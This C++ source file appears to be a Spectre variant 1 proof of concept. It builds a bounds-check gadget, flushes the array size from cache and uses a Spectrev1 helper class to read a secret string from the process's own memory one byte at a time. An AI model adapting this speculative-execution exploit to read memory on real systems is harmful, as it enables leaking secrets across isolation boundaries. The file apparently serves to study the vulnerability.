//
// Created by sage on 1/12/21.
//
#include <stdafx.h>
#include <cacheutils.h>
#include <Spectrev1.h>
// gdb -batch -ex 'file CacheCash' -ex 'disassemble /r main'

unsigned int array1_size = 16;
uint8_t unused[64]; // seperate by a cacheline
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64]; // seperate by a cacheline
uint8_t array2[MAX_BYTE*BLOCK_LEN];

const char* secret = "The cake is a lie!\n";

volatile uint8_t get_elem(size_t x)
{
    // Make this volatile or compiler might optimize out
    volatile uint8_t res = 0;
    if (x < array1_size)
    {
        res &= array2[array1[x]*256];
    }
    return res;
}

int main()
{
    Spectrev1 s(array1,
                array2,
                [](volatile size_t x){flush(&array1_size); get_elem(x);},
                [](size_t _t){return _t%array1_size;},
                256,
                MAX_TRIES,
                45
    );

//    uint8_t recovered[20];
//    s.read(secret, 18, recovered);
//    recovered[18] = 0;
    uint8_t val;
    uint8_t *m_addr = reinterpret_cast<uint8_t*>(const_cast<char*>(secret));
    for (size_t i = 0; i  < 50; ++i)
    {
        s.read_byte(m_addr +i, &val);
        printf("0x%02X = %c\n", val, val);
    }
}
